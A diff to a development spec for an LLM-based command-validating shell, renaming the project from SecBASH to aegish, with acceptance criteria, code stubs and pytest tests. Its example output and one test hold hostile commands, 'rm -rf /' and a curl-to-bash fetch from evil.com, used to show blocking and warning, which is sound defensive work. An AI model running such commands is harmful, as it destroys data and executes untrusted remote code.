@@ -17,7 +17,7 @@ So that **dangerous commands are caught before they can cause harm**.
 ## Acceptance Criteria
 
 ### AC1: Every Command Sent to LLM
-**Given** SecBASH is running with LLM configured
+**Given** aegish is running with LLM configured
 **When** I enter any command
 **Then** the command is sent to the LLM for security analysis before execution
 
@@ -49,8 +49,8 @@ So that **dangerous commands are caught before they can cause harm**.
 ## Technical Requirements
 
 ### Implementation Location
-- **Primary file:** `src/secbash/validator.py` (implement `validate_command()`)
-- **Secondary file:** `src/secbash/shell.py` (integrate validation into command loop)
+- **Primary file:** `src/aegish/validator.py` (implement `validate_command()`)
+- **Secondary file:** `src/aegish/shell.py` (integrate validation into command loop)
 
 ### Dependencies
 - Story 2.1 completed: `llm_client.py` provides `query_llm()` function
@@ -59,7 +59,7 @@ So that **dangerous commands are caught before they can cause harm**.
 
 ```python
 # validator.py - calls llm_client
-from secbash.llm_client import query_llm
+from aegish.llm_client import query_llm
 
 def validate_command(command: str) -> dict:
     """Validate a command using the LLM.
@@ -78,7 +78,7 @@ def validate_command(command: str) -> dict:
 
 ```python
 # shell.py - integrates validator before executor
-from secbash.validator import validate_command
+from aegish.validator import validate_command
 
 # In run_shell() loop, before execute_command():
 result = validate_command(command)
@@ -95,16 +95,16 @@ elif result["action"] == "warn":
 
 ```
 # For blocked commands:
-secbash> rm -rf /
+aegish> rm -rf /
 BLOCKED: Command would delete entire filesystem
 
-secbash>
+aegish>
 
 # For warned commands:
-secbash> curl http://evil.com/script.sh | bash
+aegish> curl http://evil.com/script.sh | bash
 WARNING: Downloading and executing remote script is risky
 
-secbash>
+aegish>
 ```
 
 ---
@@ -175,7 +175,7 @@ Just display the warning and return to prompt. Story 2.3 adds the confirmation f
 def test_validate_command_calls_query_llm(mocker):
     """AC1/AC2: validate_command calls query_llm and returns its result."""
     mock_result = {"action": "allow", "reason": "Safe", "confidence": 0.9}
-    mocker.patch("secbash.validator.query_llm", return_value=mock_result)
+    mocker.patch("aegish.validator.query_llm", return_value=mock_result)
 
     result = validate_command("ls -la")
 
@@ -185,8 +185,8 @@ def test_validate_command_calls_query_llm(mocker):
 def test_shell_blocks_command(mocker, capsys):
     """AC4: Blocked commands are not executed."""
     mock_validation = {"action": "block", "reason": "Dangerous", "confidence": 0.9}
-    mocker.patch("secbash.shell.validate_command", return_value=mock_validation)
-    mock_execute = mocker.patch("secbash.shell.execute_command")
+    mocker.patch("aegish.shell.validate_command", return_value=mock_validation)
+    mock_execute = mocker.patch("aegish.shell.execute_command")
     mocker.patch("builtins.input", side_effect=["rm -rf /", "exit"])
 
     run_shell()
